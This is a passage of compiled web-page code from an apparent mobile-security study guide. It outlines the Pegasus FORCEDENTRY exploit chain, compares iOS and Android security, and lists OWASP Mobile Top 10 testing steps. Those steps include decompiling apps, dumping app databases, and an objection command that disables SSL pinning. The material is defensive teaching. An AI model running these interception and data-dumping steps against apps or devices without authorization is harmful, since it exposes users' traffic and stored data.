      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), " Pegasus spyware from NSO Group used a zero-click exploit (FORCEDENTRY) targeting iMessage on iOS. No user interaction required — the target simply received an iMessage."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "technical-breakdown",
      children: "Technical Breakdown"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Component"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CVE-2021-30860 — integer overflow in CoreGraphics PDF parser"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iMessage automatically rendered the PDF attachment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heap corruption -> arbitrary code execution in image processing daemon"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Privilege escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel exploit (CVE-2021-1782) to escape sandbox"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pegasus installed as a hidden process with rootkit capabilities"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data exfiltration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Microphone, camera, GPS, iMessage, WhatsApp, Telegram, Signal"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "forcedentry-exploit-chain",
      children: "FORCEDENTRY Exploit Chain"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "iMessage arrives -> CoreGraphics processes PDF ->\nInteger overflow -> Heap overflow ->\nROP chain -> Code execution (sandboxed) ->\nKernel exploit (CVE-2021-1782) ->\nRoot privileges -> Install Pegasus ->\nHide process (rootkit) -> Exfiltrate data\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ios-security-mitigations",
      children: "iOS Security Mitigations"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "What It Prevents"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "How Pegasus Bypassed It"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Sandbox"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited app capabilities"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel exploit escaped sandbox"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Code signing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only signed code runs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exploited signed system daemon"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Random memory layout"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Information leak via side-channel"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PAC (Pointer Auth)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Function pointer integrity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KTRR bypass at kernel level"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "BlastDoor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iMessage parsing isolation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not yet implemented in iOS 14.6"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "JIT hardening"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Code execution prevention"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Used signed JIT regions"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "comparison-ios-vs-android-security-models",
      children: "Comparison: iOS vs Android Security Models"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Security Feature"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "iOS"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Android"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XNU (Darwin)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Linux (with Android patches)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mandatory Access Control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sandbox (TrustedBSD)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SELinux (enforcing)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Code signing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mandatory for all apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Optional for sideloading"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "App store"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Single: App Store"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Multiple: Play Store + others"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "App sandbox"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Per-app container (container-based)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Per-app UID (Linux user-based)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Permissions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime permission prompts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime permission prompts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware-backed (Secure Enclave)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware-backed (TEE, Titan M)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Root/Jailbreak detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Jailbreak detection in apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SafetyNet/Play Integrity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Update distribution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Direct from Apple"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OEM + carrier dependent"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mobile-security",
      children: "Mobile Security"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "android-security-model",
      children: "Android Security Model"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A building with individual apartments. Each app is an apartment with its own lock (per-app UID). Android SELinux is the building security guard — even if a tenant leaves their door open, the guard prevents them from entering other apartments."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Android Security Layers:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Linux Kernel:"
        }), " Process isolation, UID/GID per app."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SELinux (Enforcing):"
        }), " MAC (Mandatory Access Control) — defines what each process can access."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Application Sandbox:"
        }), " Each app runs as a unique Linux user. Apps can't access other apps' files."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Permissions System:"
        }), " Users grant/deny runtime permissions."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Keystore:"
        }), " Hardware-backed cryptographic key storage (TEE)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Verified Boot:"
        }), " Chain of trust from bootloader to OS."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Play Integrity API:"
        }), " Checks device integrity (SafetyNet successor)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps — Android App Sandbox:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "App is installed. Android assigns a unique Linux UID (e.g., u0_a123)."
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["App's files are created in ", (0,jsx_runtime.jsx)(_components.code, {
          children: "/data/data/com.example.app/"
        }), ", owned by that UID."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "App runs in a Dalvik/ART process with that UID as the Linux user."
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["SELinux context ", (0,jsx_runtime.jsx)(_components.code, {
          children: "u:r:untrusted_app:s0:c123,c256"
        }), " is applied — defines allowed operations."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Each file access is checked: Linux DAC (UID/GID) first, then SELinux MAC."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "App requests permissions (e.g., CAMERA) — user grants at runtime."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "App accesses camera hardware through Android's permission framework + SELinux policy."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If app tries to access another app's files, Linux DAC denies it (different UID)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Android - View app sandbox isolation (via adb shell)\nadb shell ps | grep com.example.app\n# u0_a123 - unique UID per app\n\n# Check SELinux context\nadb shell ps -Z | grep com.example.app\n# u:r:untrusted_app:s0:c123,c456,c512,c768 - SELinux context\n\n# View app permissions\nadb shell dumpsys package com.example.app | grep permissions\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ios-security-model",
      children: "iOS Security Model"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A gated community with a strict HOA (hardware-enforced security). The Secure Enclave is a separate security system for each house's safe. iMessage BlastDoor is a mailroom that inspects packages before delivery."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "iOS Security Layers:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Secure Enclave (SEP):"
        }), " Dedicated hardware for cryptographic operations. Isolated from main CPU."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Sandbox (container-based):"
        }), " Per-app container with unique home directory and sandbox profile."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Entitlements:"
        }), " Developer-signed capabilities (signing, push, iCloud, Wallet)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Code signing:"
        }), " Every binary must be signed by Apple or a registered developer certificate."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Hardware-backed encryption:"
        }), " AES engine for file encryption (per-file key wrapped by class key)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Pointer Authentication Codes (PAC):"
        }), " Prevents function pointer tampering."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "BlastDoor:"
        }), " iMessage processing in a sandboxed daemon (added iOS 14)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Entitlements Example:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-xml",
        children: "<!-- iOS entitlements - capabilities the app requests -->\n<key>com.apple.developer.associated-domains</key>\n<array>\n    <string>webcredentials:example.com</string>\n</array>\n<key>com.apple.developer.applesignin</key>\n<true/>\n<key>aps-environment</key>\n<string>production</string>\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ad-table--android-vs-ios-security",
      children: "A&D Table — Android vs iOS Security"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Android"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "iOS"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Openness"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Multiple app stores, side-loading"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Single App Store, no official sideloading"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Permission model"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Granular runtime permissions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Granular, short-lived permission timer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "TEE (Trusty, Titan M)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure Enclave (dedicated CPU)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Patch updates"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OEM-dependent, slow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apple-controlled, fast"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Malware risk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Higher (side-loading, third-party stores)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lower (no sideloading, sandbox)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Enterprise management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android Enterprise, Work Profile"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MDM, User Enrollment (managed Apple IDs)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jailbreak/Root"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Root access via bootloader unlock"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Jailbreak via software exploit only"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases--mobile-security",
      children: "Edge Cases — Mobile Security"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "iOS 17+ - Lockdown Mode:"
        }), " Applies maximum security settings. Disables most web technologies, limits messaging, blocks USB accessories."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Android - Work Profile:"
        }), " Creates a separate profile for work apps. Profile-level encryption isolates work data."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "App Cloning (Xiaomi, Samsung):"
        }), " Some Android manufacturers allow running dual instances of apps. Can bypass sandbox isolation if not properly implemented."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "iOS - App Store Review:"
        }), " Apple reviews all apps before publication. Malware can pass review and activate later (time-bomb malware)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "owasp-mobile-top-10",
      children: "OWASP Mobile Top 10"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Rank"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Vulnerability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improper Credential Usage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardcoded keys, reused credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Account takeover"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Inadequate Supply Chain Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerable libraries, malicious SDKs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data exfiltration through dependencies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Authentication/Authorization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weak biometric, no MFA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insufficient Input/Output Validation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Injection attacks (SQL, XSS)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data leakage, code execution"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Communication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cleartext traffic, weak TLS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MITM, credential interception"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Inadequate Privacy Controls"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Excessive data collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Regulatory non-compliance (GDPR, CCPA)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Data Storage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Plaintext files, unencrypted DB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data theft from lost/stolen device"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Data Handling in Background"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data in clipboard, app switcher"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data leakage via OS features"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Authentication Architecture"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weak session management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Session hijacking, replay attacks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "M10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lack of Binary Protections"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No obfuscation, no tamper detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Repackaging, reverse engineering"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "m1--improper-credential-usage",
      children: "M1 — Improper Credential Usage"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Android - Detect hardcoded credentials (using jadx decompilation)\njadx -d output_dir app.apk\ngrep -r \"password|secret|apikey\" output_dir/ --include=\"*.java\"\n\n# Found: String apiKey = \"sk_live_abcdef123456\";\n# This is M1 violation - production credentials in source code\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "m5--insecure-communication-detection",
      children: "M5 — Insecure Communication Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Intercept mobile app traffic with Burp Suite\n# Step 1: Configure Burp proxy (127.0.0.1:8080)\n# Step 2: Install Burp CA certificate on device/emulator\n# Step 3: Set device proxy to Burp\nadb shell settings put global http_proxy 192.168.1.100:8080\n\n# Step 4: Run app and observe HTTP traffic\n# Look for:\n# - HTTP (not HTTPS) connections\n# - Missing certificate pinning\n# - Hostname verification disabled\n# - Weak cipher suites\n\n# Check for SSL pinning bypass with objection (iOS)\nobjection -g com.example.app explore\nios sslpinning disable\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "m7--insecure-data-storage-detection",
      children: "M7 — Insecure Data Storage Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Android - Check for insecure data storage\nadb shell\nrun-as com.example.app\ncat /data/data/com.example.app/shared_prefs/*.xml\n# Look for: passwords, tokens, PII stored in cleartext\n\n# iOS - Check for insecure data storage\nobjection -g com.example.app explore\nenv\nios nsuserdefaults get\n\n# Check for SQLite databases with unencrypted sensitive data\nadb shell\nfind /data/data/com.example.app -name \"*.db\" -exec sqlite3 {} .dump \\;\n# Look for: credit card numbers, personal data without encryption\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "m2--supply-chain-security",
      children: "M2 — Supply Chain Security"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Scan Android app dependencies for known vulnerabilities\n# Using OWASP Dependency-Check\ndependency-check --project \"Mobile App\" --scan app.apk --format HTML\n\n# Check for known malicious SDKs\nunzip -l app.apk | grep -E \"\\.jar|\\.aar\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mobile-app-security-testing",
      children: "Mobile App Security Testing"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "android-apk-decompilation-with-jadx",
      children: "Android APK Decompilation with jadx"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Decompile APK to Java source\njadx -d decompiled_app app.apk\n# Output: decompiled_app/sources/com/example/app/*.java\n\n# Step 2: Search for security-sensitive code\n# Hardcoded secrets\ngrep -r \"apiKey|secret|password|token\" decompiled_app/\n\n# Insecure WebView\ngrep -r \"setJavaScriptEnabled|loadUrl|addJavascriptInterface\" decompiled_app/\n\n# Root detection bypass\ngrep -r \"su|Superuser|magisk|rootbeer\" decompiled_app/\n\n# Step 3: Check AndroidManifest.xml\naapt dump badging app.apk | grep -E \"uses-permission|android:debuggable|exported\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run — APK Security Analysis:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Input: app.apk (Android banking app)\n1. Decompile: jadx -d out app.apk -> 45 Java source files\n2. Check manifest: android:allowBackup=\"true\", permissions: INTERNET, READ_SMS, CAMERA\n3. Search for secrets: Found \"apiKey=AIzaSy...\" in source code -> M1 violation\n4. Search for insecure storage: SharedPreferences storing access token -> M7 violation\n5. Search for cleartext traffic: android:usesCleartextTraffic=\"true\" -> M5 violation\n6. Check WebView: setJavaScriptEnabled(true), no XSS protection -> injection risk\n7. Check root detection: No RootBeer or Safetynet checks found -> tampering risk\nOutput: 5 security issues identified (2 HIGH, 2 MEDIUM, 1 LOW)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ios-ipa-analysis-with-objection",
      children: "iOS IPA Analysis with objection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
